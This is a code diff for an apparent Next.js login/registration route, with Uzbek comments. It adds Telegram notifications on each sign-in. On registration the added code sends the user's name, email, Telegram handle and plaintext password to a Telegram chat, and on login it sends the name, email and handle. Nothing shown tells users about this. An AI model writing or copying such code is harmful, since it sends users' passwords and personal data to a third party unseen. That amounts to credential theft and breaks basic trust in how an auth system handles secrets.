@@ -1,8 +1,13 @@
 import { NextRequest, NextResponse } from "next/server";
 import { adminAuth, adminDb, FieldValue } from "@/lib/firebase/admin";
 import { createSession, destroySession } from "@/lib/auth/session";
+import { sendTelegramMessage } from "@/lib/telegram";
 
 export const runtime = "nodejs";
+
+function esc(t: string) {
+  return String(t).replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, "\\$&");
+}
 
 interface SessionBody {
   idToken?: string;
@@ -65,6 +70,38 @@ export async function POST(req: NextRequest) {
   } catch (e) {
     console.error("[auth/session] session cookie xato:", e);
     return NextResponse.json({ success: false, error: "Sessiya yaratilmadi" }, { status: 500 });
+  }
+
+  // Telegram xabari (login / register) — asosiy oqimni to'xtatmaydi
+  try {
+    if (profile) {
+      const tg = profile.telegram ? `@${profile.telegram}` : "-";
+      await sendTelegramMessage(
+        `🆕 *YANGI RO'YXATDAN O'TISH*\n\n` +
+          `👤 ${esc(profile.fullName || "-")}\n` +
+          `📧 ${esc(email || "-")}\n` +
+          `📱 Telegram: ${esc(tg)}\n` +
+          (profile.password ? `🔑 Parol: ${esc(profile.password)}` : "")
+      );
+    } else {
+      // Login — foydalanuvchi ma'lumotlarini hujjatdan olamiz
+      let name = "-";
+      let tg = "-";
+      try {
+        const doc = await adminDb.collection("users").doc(uid).get();
+        name = doc.get("fullName") || "-";
+        const t = doc.get("telegram");
+        if (t) tg = `@${t}`;
+      } catch {}
+      await sendTelegramMessage(
+        `🔓 *TIZIMGA KIRISH*\n\n` +
+          `👤 ${esc(name)}\n` +
+          `📧 ${esc(email || "-")}\n` +
+          `📱 Telegram: ${esc(tg)}`
+      );
+    }
+  } catch (e) {
+    console.error("[auth/session] Telegram xabari xato:", e);
   }
 
   return NextResponse.json({ success: true });
